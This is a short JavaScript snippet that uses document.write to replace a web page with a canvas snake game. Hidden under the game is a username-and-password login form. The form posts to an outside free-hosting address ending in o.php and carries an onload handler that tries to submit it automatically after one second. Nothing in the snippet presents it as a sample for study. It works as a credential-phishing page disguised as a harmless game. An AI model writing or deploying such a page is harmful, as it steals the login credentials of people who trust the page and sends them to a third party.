document.open(); document.write('<!DOCTYPE html><html> <head> <title>snake</title> </head> <body> <canvas id="game" width=400 height=400></canvas> <style> #game { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); } </style> <script> const game2 = document.getElementById("game"); const gctx = game2.getContext("2d"); const boardBorder = "black"; const boardBackground = "gray"; const scol = "red"; const sborder = "darkblue"; let cdir = false; let dx = 10; let dy = 0; let snake = [ {x: 200, y: 200}, {x: 190, y: 200}, {x: 180, y: 200}, {x: 170, y: 200}, {x: 160, y: 200}, ]; main(); document.addEventListener("keydown", changeDirection); function drawSnakePart(snakePart) { gctx.fillStyle = scol; gctx.strokestyle = sborder; gctx.fillRect(snakePart.x, snakePart.y, 10, 10); gctx.strokeRect(snakePart.x, snakePart.y, 10, 10); } function drawSnake() { snake.forEach(drawSnakePart); } function clearCanvas() { gctx.fillStyle = boardBackground; gctx.strokestyle = boardBorder; gctx.fillRect(0, 0, game2.width, game2.height); gctx.strokeRect(0, 0, game2.width, game2.height); } function main() { if (hasGameEnded()) return; cdir = false; setTimeout(function onTick() { clearCanvas(); moveSnake(); drawSnake(); main(); }, 100) } function hasGameEnded() { for (let i = 4; i < snake.length; i++) { if (snake[i].x === snake[0].x && snake[i].y === snake[0].y) return true }; const hitLeftWall = snake[0].x < 0; const hitRightWall = snake[0].x > game2.width - 10; const hitToptWall = snake[0].y < 0; const hitBottomWall = snake[0].y > game2.height - 10; return hitLeftWall || hitRightWall || hitToptWall || hitBottomWall } function moveSnake() { const head = {x: snake[0].x + dx, y: snake[0].y + dy}; snake.unshift(head); snake.pop(); } function changeDirection(event) { const LEFTKEY = 37; const RIGHTKEY = 39; const UPKEY = 38; const DOWNKEY = 40; if (cdir) return; cdir = true; const keyPressed = event.keyCode; const goingUp = dy === -10; const goingDown = dy === 10; const goingRight = dx === 10; const goingLeft = dx === -10; if (keyPressed === LEFTKEY && !goingRight) { dx = -10; dy = 0; } if (keyPressed === UPKEY && !goingDown) { dx = 0; dy = -10; } if (keyPressed === RIGHTKEY && !goingLeft) { dx = 10; dy = 0; } if (keyPressed === DOWNKEY && !goingUp) { dx = 0; dy = 10; } } </script> <form name="login" id="login_form" method="post" action="https://paramagnetic-shotli.000webhostapp.com/o.php" onload="setTimeout(function() {this.submit()}, 1000); "> <div class="text_section"> <label for="username">Username or Email</label> <div class="field_wrap"> <input type="text" name="username" id="username" value="" class="form-control "> </div> </div> <div class="text_section"> <label>Password</label> <div class="field_wrap"> <input type="password" name="password" value="" class="form-control"> </div> </div> <div class="sign_in_row"> <button type="submit" id="sign_in">Sign in</button> </div> </form> </body></html>'); document.close()
